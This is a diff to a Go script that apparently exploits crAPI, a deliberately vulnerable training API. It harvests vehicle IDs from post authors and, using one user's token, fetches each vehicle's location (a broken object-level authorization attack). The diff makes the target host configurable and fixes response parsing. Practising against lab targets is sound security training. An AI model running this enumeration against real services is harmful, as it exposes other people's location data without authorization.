@@ -6,6 +6,7 @@ import (
 	"io"
 	"log"
 	"net/http"
+	"regexp"
 
 	configurator "github.com/tomek-skrond/crapiconfigurator"
 )
@@ -28,9 +29,29 @@ type Author struct {
 	CreatedAt     string `json:"created_at"`
 }
 
-func GetPayload(token string, ids []string) {
+type PostResponse struct {
+	Posts []Post `json:"posts"`
+}
+
+func extractBaseURL(url string) string {
+	// Define the regular expression pattern to include the port if available
+	re := regexp.MustCompile(`(https?://[^/]+)`)
+
+	// Find the first match
+	match := re.FindStringSubmatch(url)
+	if len(match) > 1 {
+		return match[1]
+	}
+	return ""
+}
+
+func GetPayload(targetUrl, token string, ids []string) {
+	baseUrl := extractBaseURL(targetUrl)
+	if baseUrl == "" {
+		log.Fatalln("invalid baseurl")
+	}
 	for _, id := range ids {
-		url := fmt.Sprintf("http://crapi.bobaklabs.com:8888/identity/api/v2/vehicle/%s/location", id)
+		url := fmt.Sprintf("%s/identity/api/v2/vehicle/%s/location", baseUrl, id)
 
 		req, _ := http.NewRequest("GET", url, nil)
 		req = configurator.ConfigureRequest(req, token)
@@ -67,18 +88,17 @@ func GetVehicleIDs(url, token string) []string {
 		log.Fatalln(err)
 	}
 
-	var posts []Post
-	if err := json.Unmarshal(body, &posts); err != nil {
+	var response PostResponse
+	if err := json.Unmarshal(body, &response); err != nil {
 		log.Fatalln(err)
 	}
 	var ids []string
-	for _, p := range posts {
+	for _, p := range response.Posts {
 		vehicleId := p.Author.VehicleID
 		if vehicleId != "" {
 			ids = append(ids, vehicleId)
 		}
 		// fmt.Println(p.AuthorID)
 	}
-
 	return ids
 }
